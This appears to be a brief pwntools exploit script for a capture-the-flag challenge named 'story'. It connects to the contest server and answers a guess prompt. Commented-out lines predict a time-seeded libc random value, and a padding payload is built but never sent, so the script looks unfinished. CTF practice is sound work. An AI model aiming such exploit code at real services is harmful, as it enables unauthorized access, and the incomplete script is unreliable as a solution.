from pwn import *
# from ctypes import *
# LIBC = cdll.LoadLibrary('./libc.so.6')
# LIBC.srand(LIBC.time(0))
# print(LIBC.rand() % 1000)

# # io = process('./story')
# # gdb.attach(io, api=True)
io = remote('story.ctf.pragyan.org', 6004)

payload = b'a'*30 + b'\x00'
io.recvuntil(b'guess: ')
io.sendline()
io.interactive()